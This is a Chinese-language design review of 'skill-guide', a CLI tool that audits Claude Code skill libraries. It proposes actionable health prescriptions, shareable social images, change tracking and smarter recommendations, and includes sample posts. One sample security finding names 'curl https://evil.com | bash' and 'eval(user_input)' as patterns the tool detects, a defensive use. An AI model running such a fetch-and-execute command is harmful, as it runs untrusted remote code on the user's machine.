# Skill Guide 全面评估与提升方案

**状态：** 设计中
**日期：** 2026-05-27

---

## 一、当前产品全景

### 1.1 模式总览

| 模式 | 命令 | 输出形式 | 核心价值 |
|------|------|---------|---------|
| Discovery | `--open` | HTML 幻灯片 | 发现"我有什么" |
| Deep-dive | `--skill <name>` | HTML 详情页 | 深入了解一个技能 |
| Search | `--search <query>` | HTML 推荐列表 | 找到适合任务的技能 |
| Full | `--full` | HTML 完整手册 | 全部技能参考 |
| Share | `--share` | HTML 作品集 | 展示技能栈 |
| Recommend | `--recommend` | HTML 报告 | 发现缺失的技能 |
| Health | `--health` | HTML 仪表盘 | 诊断技能库健康 |
| Doctor | `--doctor` | 终端文本 | 环境诊断 |

### 1.2 代码规模

- `skill-guide.js`: 2,179 行（展示层）
- `scan-skills.js`: 796 行（数据层）
- `skill-registry.js`: ~250 行（在线目录层）
- 总计 ~3,225 行，零依赖

---

## 二、用户旅程分析

### 2.1 首次用户旅程

```
发现 → npx skill-guide --open → "哇，我有 341 个技能！" → 浏览幻灯片 → 关闭
      ↓
      问题：这是一次性体验。看完之后呢？
```

**现状：** 首次体验很好（视觉冲击），但缺乏"钩子"让用户回来。

**对比：**
- `npm audit` → 用户会反复运行（每次安装依赖后）
- `lighthouse` → 用户会反复运行（每次部署前）
- `skill-guide` → 用户运行一次后...然后呢？

### 2.2 日常用户旅程

```
需要某个功能 → 想到有技能 → 但不知道用哪个 → 手动翻 ~/.claude/skills → 放弃
```

**现状：** `--search` 功能存在，但用户不会自然地想到用它。因为：
1. 用户不知道自己有 341 个技能（除非先跑过 `--open`）
2. 搜索是被动的（用户需要主动运行命令）
3. 没有与 Claude Code 的工作流集成

### 2.3 分享者旅程

```
跑 --health → 看到"你是收藏家" → 想分享 → 复制文本 → 粘贴到社交媒体 → 但效果一般
```

**现状：** 分享机制存在（复制到剪贴板），但：
1. 复制的是纯文本，不是图片（社交媒体需要图片才有传播力）
2. 没有预写好的社交媒体文案
3. 分享内容不能直接引流（没有 "Try it: npx skill-guide --health"）

---

## 三、核心问题诊断

### 问题 1：一次性工具 vs 持续价值

**症状：** 用户跑一次 `--open` 后就没有理由再跑。

**根因：** 所有输出都是静态快照，不追踪变化。

**类比：**
- `npm audit` 之所以有人用，是因为每次 `npm install` 后都需要检查
- `git status` 之所以有人用，是因为每次改代码后都需要看
- `skill-guide` 缺少这个"触发器"

**解法方向：**
- 技能变化追踪（"你新增了 5 个技能"）
- 定期健康检查提醒
- 与 Claude Code 会话集成（"你刚才用了 tdd 技能，但你还有 3 个类似的"）

### 问题 2：诊断 ≠ 治疗

**症状：** Health 模式说"7 个技能有安全风险"，但不告诉你具体是哪 7 个，也不告诉你怎么修。

**根因：** 处方是通用的，不是基于用户实际数据的。

**当前处方示例：**
```
🛡️ Security Review [medium]
   7 skills have security flags, recommend manual review
```

**问题：**
- "recommend manual review" — 用户要怎么做？手动检查 341 个技能？
- 不告诉用户哪 7 个有问题
- 不告诉用户具体是什么风险（curl | bash？eval？）

**更好的处方：**
```
🛡️ Security Review [medium]
   7 skills have risky patterns (curl|bash, eval, etc.)

   具体列表：
   1. risky-skill — curl https://evil.com | bash
   2. another-skill — eval(user_input)
   3. ...

   修复建议：
   - 检查这些技能的 SKILL.md，确认是否信任来源
   - 移除不需要的技能：rm -rf ~/.claude/skills/risky-skill
```

### 问题 3：分享缺乏传播力

**症状：** 用户可以复制报告到剪贴板，但复制的是纯文本。

**根因：** 社交媒体传播靠图片，不靠文字。

**当前分享内容：**
```
My Skill Health Score: 66/100
I'm a "Collector" 🏛️ — 341 skills, 20K tokens before I even type!
...
```

**问题：**
- Twitter/X: 纯文本推文的互动率远低于图片推文
- LinkedIn: 需要图片才能出现在 feed 中
- 微信: 需要图片才能转发

**更好的分享：**
- 生成一张精美的 PNG 图片（包含雷达图 + 评分 + 人格）
- 预写社交媒体文案（一键复制）
- 包含引流链接（"Try it: npx skill-guide --health"）

### 问题 4：搜索不够智能

**症状：** `--search security` 返回 20+ 个技能，用户不知道选哪个。

**根因：** 搜索是关键词匹配，不是语义理解。

**当前搜索结果：**
```
1. security-audit
2. alibabacloud-network-reachability-analysis
3. alibabacloud-ram-permission-diagnose
4. cso-review
5. defi-amm-security
6. django-security
7. django-verification
...
```

**问题：**
- 用户说"帮我做安全审计"，应该直接推荐 `security-audit`，而不是列 20 个
- 没有考虑技能的质量（completeness score）
- 没有考虑用户的使用场景（Web？Mobile？Cloud？）

**更好的搜索：**
- 基于任务描述的语义匹配（不只是关键词）
- 按质量排序（completeness score 高的优先）
- 提供"最佳推荐"而不是"所有匹配"

### 问题 5：缺少与 Claude Code 的集成

**症状：** skill-guide 是一个独立的 CLI，用户需要手动运行。

**根因：** 没有与 Claude Code 的工作流集成。

**机会：**
- Claude Code 会话开始时，自动提示"你有 341 个技能，但过去 7 天只用了 5 个"
- 用户说"帮我做 X"时，自动推荐相关技能
- 用户完成任务后，提示"你刚才用了 tdd 技能，你还有 3 个类似的技能"

---

## 四、提升方案（按优先级）

### P0：让处方真正可操作

**目标：** 从"诊断"升级到"治疗"。

**具体改进：**

1. **显示具体问题技能**
   - 安全处方：列出有风险的技能名称和具体风险模式
   - 预算处方：列出描述最长的 5 个技能
   - 陈旧处方：列出超过 30 天未更新的技能

2. **提供具体修复命令**
   - 安全：`rm -rf ~/.claude/skills/risky-skill`
   - 预算：`npx skill-guide --skill risky-skill` 查看详情
   - 陈旧：`npx skill-guide --skill stale-skill` 查看详情

3. **在 HTML 中可点击展开**
   - 处方卡片点击后展开，显示具体技能列表
   - 每个技能旁边有"查看详情"链接

**预期效果：** 用户看完处方后知道具体该做什么，而不是"建议人工审查"。

### P1：生成可分享的社交图片

**目标：** 让分享内容在社交媒体上有传播力。

**具体改进：**

1. **生成 PNG 图片**
   - 包含：健康评分 + 人格 + 雷达图 + 关键数据
   - 尺寸：1200x630px（Twitter/LinkedIn 最佳尺寸）
   - 风格：深色背景，渐变色，与 HTML 仪表盘一致

2. **预写社交媒体文案**
   - Twitter: "My AI skill library scored 66/100. I'm a 'Collector' 🏛️ with 341 skills! Try yours: npx skill-guide --health"
   - LinkedIn: 更详细的版本，包含关键数据点
   - 微信: 中文版本

3. **一键分享**
   - 复制图片到剪贴板
   - 复制文案到剪贴板
   - 打开 Twitter/LinkedIn 发帖页面

**预期效果：** 用户分享的内容在社交媒体上更吸引眼球，带来更多流量。

### P2：技能变化追踪

**目标：** 给用户一个理由反复运行 skill-guide。

**具体改进：**

1. **存储历史快照**
   - 每次运行 `--health` 时，保存快照到 `~/.skill-guide/history/`
   - 快照包含：日期、技能数量、健康评分、五维分数

2. **显示变化趋势**
   - "你的健康评分从 60 提升到 66 (+10%)"
   - "你新增了 5 个技能"
   - "你的安全分数从 30 提升到 50"

3. **生成变化报告**
   - `--health --diff` 显示自上次以来的变化
   - HTML 报告中包含趋势图

**预期效果：** 用户有理由定期运行 skill-guide，形成习惯。

### P3：智能技能推荐

**目标：** 让搜索从"关键词匹配"升级到"任务推荐"。

**具体改进：**

1. **基于任务描述的推荐**
   - 用户说"帮我做安全审计" → 推荐 `security-audit`（置信度 95%）
   - 用户说"帮我写测试" → 推荐 `tdd-workflow`（置信度 90%）

2. **按质量排序**
   - 优先推荐 completeness score 高的技能
   - 标记"最佳推荐"和"备选推荐"

3. **提供使用示例**
   - 显示技能的 triggers（触发词）
   - 显示技能的使用场景

**预期效果：** 用户更容易找到适合的技能，提高使用率。

### P4：Claude Code 集成

**目标：** 让 skill-guide 成为 Claude Code 工作流的一部分。

**具体改进：**

1. **会话开始提示**
   - Claude Code 会话开始时，提示"你有 341 个技能，但过去 7 天只用了 5 个"
   - 提示"你有 3 个新技能还没试过"

2. **任务中推荐**
   - 用户说"帮我做 X"时，自动推荐相关技能
   - 显示"你有 3 个技能可以做这个，最推荐的是..."

3. **任务后反馈**
   - 用户完成任务后，提示"你刚才用了 tdd 技能，你还有 3 个类似的技能"
   - 提示"你已经 30 天没用 security-audit 了，要不要跑一次？"

**预期效果：** skill-guide 从独立工具变成 Claude Code 生态的一部分。

---

## 五、分享传播分析

### 5.1 当前分享内容评估

| 维度 | 当前状态 | 问题 |
|------|---------|------|
| 视觉冲击 | 7/10 | HTML 仪表盘好看，但分享的是文本 |
| 社交货币 | 8/10 | "收藏家"人格是好的社交货币 |
| 分享便利性 | 5/10 | 复制文本到剪贴板，但没有图片 |
| 引流能力 | 3/10 | 没有"Try it"链接 |
| 传播力 | 4/10 | 纯文本在社交媒体上传播力弱 |

### 5.2 理想分享内容

**Twitter/X 推文：**
```
My AI skill library scored 66/100 🎯

I'm a "Collector" 🏛️ — 341 skills, 20K tokens before I even type!

📊 Stats:
• Token Cost: ~20.3K (10% of context)
• Budget Usage: 504%
• Security: 7 flags

💡 Fun Fact: My skills use 10% of my context window before I type a single character!

Try yours: npx skill-guide --health

[图片：雷达图 + 评分 + 人格]
```

**LinkedIn 帖子：**
```
I just analyzed my AI skill library and found some interesting insights:

🎯 Health Score: 66/100
🏛️ Personality: "The Collector" — 341 skills, rich but needs curation

📊 Key Findings:
• Token Cost: ~20.3K (10% of context window)
• Budget Usage: 504% (way over!)
• Security: 7 skills have risk flags
• Organization: 100/100 (well categorized)

💡 Fun Fact: My skills use 10% of my context window before I type a single character!

The tool also gives you a radar chart showing 5 dimensions of your skill library health.

Try it yourself: npx skill-guide --health

#AI #ClaudeCode #Productivity #SkillManagement
[图片：雷达图 + 评分 + 人格]
```

### 5.3 传播策略

**目标人群：**
1. Claude Code 用户（最直接的目标用户）
2. AI 工具爱好者（会尝试新工具）
3. 开发者（对生产力工具感兴趣）

**传播渠道：**
1. Reddit: r/ClaudeAI, r/ChatGPTPro, r/programming
2. Hacker News: Show HN
3. Twitter/X: AI 工具圈
4. 微信公众号: 中文开发者社区

**传播内容：**
1. 功能介绍（"我做了一个技能库健康检查工具"）
2. 数据洞察（"我发现我的技能库用了 10% 的上下文窗口"）
3. 使用教程（"如何用 skill-guide 优化你的技能库"）

---

## 六、与竞品对比

| 维度 | npm audit | lighthouse | skill-guide |
|------|-----------|------------|-------------|
| 解决的问题 | 依赖安全 | 网页性能 | 技能库管理 |
| 触发频率 | 每次 npm install | 每次部署 | ？ |
| 输出形式 | 终端文本 | HTML 报告 | HTML 仪表盘 |
| 可操作性 | 高（有修复命令） | 高（有具体建议） | 中（处方不够具体） |
| 分享性 | 低 | 高（有图片） | 中（有文本，缺图片） |
| 持续价值 | 高（每次安装都需要） | 高（每次部署都需要） | 低（一次性） |

**关键差距：**
1. **触发频率：** npm audit 和 lighthouse 都有自然的触发点，skill-guide 没有
2. **可操作性：** npm audit 有 `npm audit fix`，skill-guide 的处方不够具体
3. **分享性：** lighthouse 有精美的 HTML 报告，skill-guide 缺少可分享的图片

---

## 七、总结与建议

### 7.1 当前评分

| 维度 | 评分 | 说明 |
|------|------|------|
| 首次体验 | 8/10 | 视觉冲击强，但缺乏钩子 |
| 日常价值 | 4/10 | 缺少触发点和持续价值 |
| 可操作性 | 5/10 | 处方不够具体 |
| 分享性 | 6/10 | 有社交货币，但缺图片 |
| 集成度 | 3/10 | 独立工具，未融入工作流 |
| **总体** | **5/10** | 有亮点，但缺少持续价值 |

### 7.2 提升优先级

**P0（必须做）：让处方可操作**
- 显示具体问题技能
- 提供修复命令
- 在 HTML 中可点击展开
- 预期提升：可操作性 5→8

**P1（应该做）：生成可分享图片**
- 生成 PNG 图片
- 预写社交媒体文案
- 一键分享
- 预期提升：分享性 6→9

**P2（锦上添花）：技能变化追踪**
- 存储历史快照
- 显示变化趋势
- 预期提升：日常价值 4→7

**P3（未来）：智能推荐 + Claude Code 集成**
- 基于任务的语义推荐
- 会话开始提示
- 任务中推荐
- 预期提升：集成度 3→8

### 7.3 预期效果

**修复 P0+P1 后：**
- 总体评分：5/10 → 7/10
- 分享性：6/10 → 9/10
- 可操作性：5/10 → 8/10

**修复 P0+P1+P2 后：**
- 总体评分：7/10 → 8/10
- 日常价值：4/10 → 7/10

**修复全部后：**
- 总体评分：8/10 → 9/10
- 集成度：3/10 → 8/10

---

## 八、下一步行动

### 立即行动（本周）

1. **P0：改进处方**
   - 显示具体问题技能名称
   - 提供具体修复命令
   - 在 HTML 中可点击展开

2. **P1：生成社交图片**
   - 研究 PNG 生成方案（Canvas API 或 SVG 转 PNG）
   - 设计图片模板
   - 实现一键分享

### 短期行动（下周）

3. **P2：技能变化追踪**
   - 设计快照存储格式
   - 实现变化检测
   - 生成变化报告

### 中期行动（本月）

4. **P3：智能推荐**
   - 研究语义匹配方案
   - 实现任务描述解析
   - 优化推荐算法

5. **P4：Claude Code 集成**
   - 研究 Claude Code hook 机制
   - 实现会话开始提示
   - 实现任务中推荐

---

## 九、关键洞察

### 9.1 工具成功的三个条件

1. **解决真实痛点** — skill-guide 解决了"我不知道我有什么技能"的痛点
2. **有自然触发点** — npm audit 有 `npm install`，lighthouse 有部署，skill-guide 缺少
3. **输出可分享** — lighthouse 的 HTML 报告可以截图分享，skill-guide 缺少图片

### 9.2 skill-guide 的独特优势

1. **人格分析** — "你是收藏家"是独特的社交货币
2. **雷达图** — 五维可视化是独特的视觉元素
3. **零依赖** — 可以 `npx` 直接运行，门槛极低

### 9.3 最大的机会

**Claude Code 生态：**
- Claude Code 用户数量在快速增长
- 技能管理是用户的共同痛点
- skill-guide 可以成为技能管理的标准工具

**社交传播：**
- 人格分析 + 雷达图 = 强大的社交货币
- 如果能生成精美图片，传播力会大幅提升
- "我是什么类型的技能管理者？" 这个问题本身就很有传播力

---

## 十、结论

**skill-guide 当前状态：** 有亮点（视觉、人格、雷达图），但缺少持续价值和可操作性。

**最大的差距：** 诊断 ≠ 治疗。用户看完报告后不知道具体该做什么。

**最大的机会：** 让处方真正可操作 + 生成可分享图片 = 传播力大幅提升。

**预计效果：**
- P0+P1 完成后：总体评分 5→7，分享性 6→9
- 全部完成后：总体评分 8→9，成为 Claude Code 生态的标准工具

---

## 附录：用户分享内容示例（理想状态）

### Twitter/X 推文

```
My AI skill library scored 66/100 🎯

I'm a "Collector" 🏛️ — 341 skills, 20K tokens before I even type!

📊 Stats:
• Token Cost: ~20.3K (10% of context)
• Budget Usage: 504%
• Security: 7 flags

💡 Fun Fact: My skills use 10% of my context window before I type a single character!

Try yours: npx skill-guide --health

[图片：雷达图 + 评分 + 人格]
```

### LinkedIn 帖子

```
I just analyzed my AI skill library and found some interesting insights:

🎯 Health Score: 66/100
🏛️ Personality: "The Collector" — 341 skills, rich but needs curation

📊 Key Findings:
• Token Cost: ~20.3K (10% of context window)
• Budget Usage: 504% (way over!)
• Security: 7 skills have risk flags
• Organization: 100/100 (well categorized)

💡 Fun Fact: My skills use 10% of my context window before I type a single character!

The tool also gives you a radar chart showing 5 dimensions of your skill library health.

Try it yourself: npx skill-guide --health

#AI #ClaudeCode #Productivity #SkillManagement
[图片：雷达图 + 评分 + 人格]
```

### 微信朋友圈

```
刚分析了我的 AI 技能库，发现了一些有趣的数据：

🎯 健康评分：66/100
🏛️ 人格类型："收藏家" — 341 个技能，丰富但需要策展人

📊 关键发现：
• Token 成本：~20.3K（占上下文窗口 10%）
• 预算使用：504%（严重超标！）
• 安全性：7 个技能有风险标记
• 组织性：100/100（分类完善）

💡 趣味数据：我的技能在还没说话之前，就用掉了 10% 的上下文窗口！

这个工具还会生成一个雷达图，展示技能库的 5 个维度。

试试你的：npx skill-guide --health

[图片：雷达图 + 评分 + 人格]
```
